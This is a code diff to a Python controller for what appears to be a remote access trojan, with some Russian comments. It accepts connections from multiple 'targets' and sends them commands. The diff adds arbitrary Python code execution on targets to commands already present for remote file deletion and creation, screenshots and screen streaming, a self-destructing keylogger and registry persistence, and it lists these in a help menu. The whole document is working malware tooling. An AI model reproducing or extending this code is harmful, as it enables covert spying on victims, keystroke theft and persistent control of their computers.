@@ -191,22 +191,23 @@ def solo_command(session_num, command):
 				elif command == 'disconnect':
 						end_session(target, num)
 				elif command[:3] == 'cd ':
-						result = reliable_recv(target).split(',')
+					#.split(',')
+						result = reliable_recv(target)
 						output_catalog_to_html(result)
 				elif command[:2] == 'ls':
-						result = reliable_recv(target).split(',')
+						result = reliable_recv(target)
 						output_catalog_to_html(result)
 				elif command[:12] == 'create_file ':
-						result = reliable_recv(target).split(',')
+						result = reliable_recv(target)
 						output_catalog_to_html(result)
 				elif command[:12] == 'delete_file ':
-						result = reliable_recv(target).split(',')
+						result = reliable_recv(target)
 						output_catalog_to_html(result)
 				elif command[:14] == 'create_folder ':
-						result = reliable_recv(target).split(',')
+						result = reliable_recv(target)
 						output_catalog_to_html(result)
 				elif command[:14] == 'delete_folder ':
-						result = reliable_recv(target).split(',')
+						result = reliable_recv(target)
 						output_catalog_to_html(result)
 				elif command[:7] == 'upload ':
 						upload_file(target, command[7:])
@@ -216,21 +217,41 @@ def solo_command(session_num, command):
 						screenshot(target, count)
 						count += 1
 				elif command[:13] == 'screen_stream':
-						open_stream(target)
+						open_stream2(target)
 				elif command[:15] == 'get_system_info':
 						result = reliable_recv(target).split(',')
 						print_list_to_html(result)
+				elif command[:12] == 'python_exec ':
+						result = reliable_recv(target)
+						output_to_html(result)
+				elif command[:17] == 'python_exec_file ':
+						result = reliable_recv(target)
+						output_to_html(result)
 				elif command == 'help':
 						output_to_html('''<br>
 							quit								--> Quit Session With Target<br>
+							disconnect					--> Disconnect Target for 20s<br>
 							clear								--> Clear The Screen<br>
+							<br>
 							cd *Directory Name*	--> Change Directory On Target<br>
+							ls									--> View what is inside folder<br>
+							<br>
+							create_file *NAME*  --> Create file on Target<br>
+							delete_file *NAME*  --> Delete file on Target<br>
+							create_folder *NAME*--> Create folder on Target<br>
+							delete_folder *NAME*--> Delete folder on Target<br>
+							<br>
 							upload *file name*	--> Upload File To the target Machine<br>
 							download *file name*--> Download File From target Machine<br>
 							screenshot					--> Take a screenshot<br>
+							<br>
 							keylog_start				--> Start the Keylogger<br>
 							keylog_dump					--> Print Keystrokes That The Target Inputted<br>
 							keylog_stop					--> Stop And Self Destruct Keylogger File<br>
+							<br>
+							python_exec *code* 								--> Execute python code<br>
+							python_exec_file *fileName* 			--> Execute python file<br>
+							<br>
 							persistence *RegName* *fileName*	--> Create Persistence In The Registry (To Autoload)<br>
 						''')
 				else:
@@ -273,7 +294,7 @@ port = 5555
 # TCP  - socket.SOCK_STREAM
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(('127.0.0.1', port))
-
+# Ограничение на 5 узлов
 sock.listen(5)
 t1 = threading.Thread(target=accept_conections)
 t1.start()
@@ -327,41 +348,3 @@ def common_command(command):
 eel.start('main.html')
 
 ####
-""" 
-
-##### solo_command
-
-				# При получении следующей команды мы не закроем программу на удаленной машине
-				# Но это нам позволит вернуться в Command Center
-				elif command == 'back_to_center':
-						pass #break
-				elif command == 'clear':
-						os.system('cls')
-
-##### common_command
-
-	elif command == 'clear':
-				os.system('cls')
-		# Завершаем сесси на всех устройствах
-		elif command == 'exit':
-				for target in targets:
-						reliable_send(target, 'quit')
-						# Закривает сокет удаленного устройства
-						target.close()
-				# Закрывает свой сокет
-				sock.close()
-				# Устанавливаем флаг, что прервет accept_connections
-				stop_flag = True
-				t1.join()
-				# break
-		# Разорвать сессию
-		# kill 3
-		# 3 - session ID
-		elif command[:5] == 'kill ':
-				targ = targets[int(command[5:])]
-				ip = ips[int(command[5:])]
-				reliable_send(targ, 'quit')
-				targ.close()
-				targets.remove(targ)
-				ips.remove(ip)
-"""
